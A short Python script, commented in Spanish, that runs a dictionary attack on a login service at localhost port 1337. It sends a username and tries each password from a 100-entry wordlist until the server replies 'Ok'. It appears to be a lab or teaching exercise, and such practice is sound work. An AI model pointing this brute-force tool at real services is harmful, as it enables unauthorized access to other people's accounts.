"""
Uso: Ataque de diccionario
Creador: Andrés Hernández Mata
Version: 1.0.0
Python: 3.9.1
Fecha: 30 Abril 2020
"""

import socket
from datetime import datetime
import os

os.system("cls")

print(datetime.now(), '\033[0;32m [INFO] Utilizando modulo socket \033[0;0m')

host = "localhost"
puerto = 1337

print(datetime.now(), '\033[0;32m [INFO] Definiendo host remoto y puerto \033[0;0m')

try:
    while(True):        
        usuario = input("Usuario: ")
        if usuario != '':
            break
        print(datetime.now(), '\033[0;91m [INFO] El usuario es un campo obligatorio \033[0;0m')
    for password in open("100passwords.txt").read().split():
        while(True):
            print(datetime.now(), '\033[0;32m [INFO] Estableciendo conexion TCP/IP \033[0;0m')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, puerto))
            sock.send(usuario.encode())
            print(datetime.now(), '\033[0;33m [INFO] Usuario: %s \033[0;0m' % usuario)
            respuesta = sock.recv(2048).decode()
            print(datetime.now(), '\033[0;32m [INFO] %s %s \033[0;0m' % (respuesta, password))
            sock.send(password.encode())
            respuesta = sock.recv(2048).decode()    
            if respuesta == "Ok":
                print()
                print(datetime.now(), '\033[0;32m [INFO] %s \033[0;0m' % respuesta)
                print(datetime.now(), '\033[0;32m [INFO] Usuario: %s \033[0;0m' % usuario)
                print(datetime.now(), '\033[0;32m [INFO] Contraseña: %s \033[0;0m' % password)
                sock.close()
                quit()
            else:
                print(datetime.now(), '\033[0;91m [INFO] %s \033[0;0m' % respuesta)
                break
except Exception as error:
    print(datetime.now(), "\033[0;91m [ERROR] Ha ocurrido un error")
    print(error)


